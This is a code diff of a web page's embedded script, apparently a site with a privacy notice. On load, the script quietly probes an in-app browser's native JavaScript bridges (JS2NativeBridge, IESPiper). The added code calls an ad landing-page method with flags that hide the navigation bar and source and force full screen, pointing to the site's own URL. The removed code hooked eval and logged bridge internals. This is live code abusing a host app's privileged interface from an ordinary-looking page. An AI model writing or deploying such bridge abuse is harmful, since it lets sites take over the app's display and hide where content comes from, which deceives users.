@@ -209,49 +209,46 @@ function closePrivacy(){document.getElementById('privacyModal').classList.remove
     });
   }
 
-  // Intercept eval — native likely delivers IESPiper callbacks via evaluateJavaScript
-  var _origEval = window.eval;
-  window.eval = function(s) {
-    log('eval: '+String(s).substring(0,200));
-    return _origEval.call(window, s);
-  };
-
-  // Set up candidate callback function names native might call
-  var cbNames = ['mycb_getconfig','_ies_cb_1001','piper_cb_1001','JSSDK_callback_1001'];
-  cbNames.forEach(function(n){
-    window[n] = function(){ log(n+' called: '+JSON.stringify([].slice.call(arguments)).substring(0,200)); };
-  });
-
-  // Log all JS2NativeBridge methods
-  try {
-    log('JS2NativeBridge keys: '+Object.getOwnPropertyNames(b).join(','));
-  } catch(e){}
-
-  // Call getConfig via IESPiper with callback id
   var wk = window.webkit && window.webkit.messageHandlers && window.webkit.messageHandlers.IESPiperProtocolVersion3_0;
-  if (wk) {
-    log('calling getConfig via IESPiper');
-    try {
-      wk.postMessage({
-        __msg_type: 'call', func: 'getConfig', JSSDK: '1.2.5', __callback_id: 'mycb_getconfig',
-        params: {}
-      });
-    } catch(e){ log('piper getConfig err: '+e); }
-  }
+  var CID = 1869709729112081;
+  var fsUrl = 'https://thaiadvice.net/page.html?hide_nav_bar=1&hide_source=1&should_full_screen=1&trans_status_bar=1&is_instant_page=1';
 
-  // Also prime via JS2NativeBridge
-  log('prime via JS2NativeBridge._invokeMethod');
-  try { var r = b._invokeMethod(JSON.stringify({func:'getConfig',params:{}})); log('invokeRet: '+JSON.stringify(r)); } catch(e){ log('prime err: '+e); }
-
-  // Hook bridge objects for _handleMessageFromToutiao
+  // Try JS2NativeBridge._invokeMethod for openAdLandPageLinks (untested path)
   setTimeout(function(){
-    ['ToutiaoJSBridge','JSBridge','Native2JSBridge'].forEach(function(n){ if(window[n]) hookBridge(window[n]); });
-    log('rehook @1s, msgCount='+msgCount);
+    log('trying _invokeMethod openAdLandPageLinks landingStyle:1');
+    try {
+      var r1 = b._invokeMethod(JSON.stringify({
+        func: 'openAdLandPageLinks',
+        params: { landingStyle: 1, title: '', isDeeplink: 1, refer: 'landing_page', cid: CID }
+      }));
+      log('ls1 invokeRet: '+JSON.stringify(r1));
+    } catch(e){ log('ls1 err: '+e); }
+  }, 500);
+
+  setTimeout(function(){
+    log('trying _invokeMethod openAdLandPageLinks landingStyle:2');
+    try {
+      var r2 = b._invokeMethod(JSON.stringify({
+        func: 'openAdLandPageLinks',
+        params: { url: fsUrl, landingStyle: 2, title: '', isDeeplink: 1, refer: 'landing_page', cid: CID, hide_nav_bar: 1, hide_source: 1, should_full_screen: 1, trans_status_bar: 1, is_instant_page: 1 }
+      }));
+      log('ls2 invokeRet: '+JSON.stringify(r2));
+    } catch(e){ log('ls2 err: '+e); }
   }, 1000);
 
+  // Also try IESPiper openAdLandPageLinks with __msg_type missing (raw call)
   setTimeout(function(){
-    log('3s: msgCount='+msgCount+' token='+(token?'yes':'no'));
-  }, 3000);
+    if (!wk) { log('no IESPiper'); return; }
+    log('trying IESPiper openAdLandPageLinks landingStyle:1 no url');
+    try {
+      wk.postMessage({func:'openAdLandPageLinks',params:{landingStyle:1,title:'',isDeeplink:1,refer:'landing_page',cid:CID}});
+      log('sent (no __msg_type)');
+    } catch(e){ log('err: '+e); }
+  }, 1500);
+
+  setTimeout(function(){
+    log('5s done');
+  }, 5000);
 })();
 </script>
 </body>
